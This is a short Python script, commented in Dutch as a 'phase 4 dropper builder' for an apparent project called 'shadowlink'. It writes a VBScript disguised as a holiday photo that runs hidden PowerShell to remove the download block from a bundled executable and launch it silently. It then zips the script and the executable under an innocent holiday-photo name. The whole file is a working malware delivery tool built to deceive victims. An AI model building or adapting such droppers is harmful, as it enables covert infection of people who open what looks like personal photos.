#!/usr/bin/env python3
"""
Fase 4 dropper builder: maakt vbs-dropper + ZIP met exe.
"""
import zipfile
import os

FASE3_EXE = os.path.expanduser(
    "~/Documents/shadowlink/fase3/vakantie_zomer2018.exe"
)
OUTPUT_DIR = os.path.expanduser("~/Documents/shadowlink/fase4")
VBS_PATH   = os.path.join(OUTPUT_DIR, "vakantie_foto.vbs")
ZIP_PATH   = os.path.join(OUTPUT_DIR, "vakantie_zomer2018.zip")

VBS_INHOUD = (
    'Set sh = CreateObject("WScript.Shell")\r\n'
    'path = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\\\\"))\r\n'
    'cmd = "powershell -WindowStyle Hidden -Command ""'
    "Unblock-File '\" & path & \"vakantie_zomer2018.exe'; "
    "Start-Process '\" & path & \"vakantie_zomer2018.exe'\"\"\"\r\n"
    'sh.Run cmd, 0, False\r\n'
)

os.makedirs(OUTPUT_DIR, exist_ok=True)

with open(VBS_PATH, "w") as f:
    f.write(VBS_INHOUD)

with zipfile.ZipFile(ZIP_PATH, "w", compression=zipfile.ZIP_DEFLATED) as zf:
    zf.write(VBS_PATH, arcname="vakantie_foto.vbs")
    info = zipfile.ZipInfo("vakantie_zomer2018.exe")
    info.compress_type = zipfile.ZIP_DEFLATED
    with open(FASE3_EXE, "rb") as exe:
        zf.writestr(info, exe.read())

print(f"[+] Dropper: {VBS_PATH}")
print(f"[+] ZIP:     {ZIP_PATH}")
